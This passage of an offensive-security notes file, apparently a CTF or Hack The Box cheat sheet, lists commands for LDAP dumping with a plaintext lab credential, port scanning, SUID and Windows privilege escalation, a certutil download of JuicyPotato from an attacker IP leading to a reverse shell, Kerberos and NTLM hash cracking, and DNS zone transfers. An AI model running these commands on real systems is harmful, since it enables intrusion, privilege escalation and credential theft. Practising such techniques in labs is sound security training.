            <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapdomaindump -u &lt;domain&gt;\\&lt;user&gt; -p &lt;password&gt; 10.10.10.169</codebox>
            <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">search.htb</codebox>
            <codebox char_offset="49" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.10.169</codebox>
          </node>
        </node>
      </node>
      <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1711186704">
        <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
        <rich_text>

   ☐  nmap -sn 10.10.10.169
   ☐  nmap -sL 10.10.10.169
   ☐  nbtscan -r 10.10.10.169

</rich_text>
        <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
        <rich_text>

   ☐  nmap  --top-ports 20 --open -iL iplist.txt
   ☐  nmap -sS -A -sV -O -p- 10.10.10.169
   ☐</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>.169


udp po</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>rts:





and then

</rich_text>
        <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -sU 10.10.10.169 ports=$(sudo nmap -sU -p0-65535 --min-rate=1000 -T4 10.10.10.169 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)</codebox>
        <codebox char_offset="240" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo nmap -sU -sV -p$ports 10.10.10.169</codebox>
      </node>
      <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Nmap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Download all the files

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Connecting:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.10.10.169</codebox>
        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.10.10.169'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.10.10.169</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1700426296">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
        <node name="Windows" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700426296" ts_lastsave="1707663867">
          <rich_text>
Use winpeas-ng from here:

</rich_text>
          <rich_text link="webs https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</rich_text>
          <rich_text>

_____________________________________________________________________________


Use windows exploit suggester -next generation


1. If u install it wesng via pip make sure u have the updated db.zip in the local directory
2. run this command on windows </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   and copy the output to a file, lets say sysinfo.txt
3. then run the following command in the local folder where the database.zip file is
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
to view exploit only issues

4. Either get the exploit checking elevation of privelege and get the relevant kernel exploit (start with MS )from ExploitDB. Ex

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

or
 you check the CVE here and view the relevant kernel exploit (u can search it)

</rich_text>
          <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</rich_text>
          <rich_text>


______________________________________________________________________________

Sherlock
</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</rich_text>
          <rich_text>   by

1. downloading the ps1 file to Target machine </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2. running
   a.</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   b. </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

should give u all the info
_________________________________________________________________________________

</rich_text>
          <rich_text scale="h2">Juicy potato 
</rich_text>
          <rich_text>
&#13;1. download juicy potato from here </rich_text>
          <rich_text link="webs https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</rich_text>
          <rich_text>
&#13;2. Transfer it to target via </rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://10.10.14.21/JuicyPotatoNG.exe jp.exe</rich_text>
          <rich_text>
&#13;3. Find ur CLSIDs from here </rich_text>
          <rich_text link="webs https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</rich_text>
          <rich_text>
&#13;4. Start a listener </rich_text>
          <rich_text family="monospace">nc -vlp 4343</rich_text>
          <rich_text>
&#13;5. run the following to get a reverse shell:   
   `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   Ex: `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>`
   
   or
   
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

   where `1337` is not the reverse shell port but a port to tell juicy potato to run stuff on ur system. Actual reverse shell with port should eb in ur `privesc.exe` file
&#13;____________________________________
also try

</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</rich_text>
          <rich_text>




_____________________________________


some privs and files to look at :


1. Check </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> it contains all the commands used from consoel
2. If machines uses LAPS use the following command </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>  (ref: </rich_text>
          <rich_text link="webs https://smarthomepursuits.com/export-laps-passwords-powershell/">https://smarthomepursuits.com/export-laps-passwords-powershell/</rich_text>
          <rich_text>)</rich_text>
          <codebox char_offset="475" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">systeminfo</codebox>
          <codebox char_offset="617" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wes sysinfo.txt --color -e</codebox>
          <encoded_png char_offset="778" justification="left" link=""></encoded_png>
          <codebox char_offset="1106" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="1124" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell-import Sherlock.ps1</codebox>
          <codebox char_offset="1132" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell Find-AllVulns</codebox>
          <codebox char_offset="1603" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\&lt;juicypotatofilename&gt; -p &lt;executable&gt; -l &lt;port&gt; -t * -c &lt;clsid&gt;`</codebox>
          <codebox char_offset="1617" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\jp.exe -p C:\Users\merlin\Desktop\privesc.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
          <codebox char_offset="1637" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev1.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
          <codebox char_offset="1994" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</codebox>
          <codebox char_offset="2094" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get-adcomputer -filter * -properties ms-mcs-admpwd | select name,ms-mcs-admpwd</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
      <node name="DNS" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700383990" ts_lastsave="1700384143">
        <rich_text scale="h2">Perform nslookup first </rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


once u know the subdomain u can use this for a dnz zonetransfer to identify more subdomains:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nslookup 10.10.10.169 10.10.10.169 </codebox>
        <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @10.10.10.169cronos.htb</codebox>
      </node>
      <node name="SNMP" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706989717" ts_lastsave="1706994186">
        <rich_text>
Use SNMP walk like:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="22" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v1 -c public 10.10.10.169</codebox>
        <codebox char_offset="29" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v2c -c public 10.10.10.169</codebox>
      </node>
    </node>
  </node>
</cherrytree>
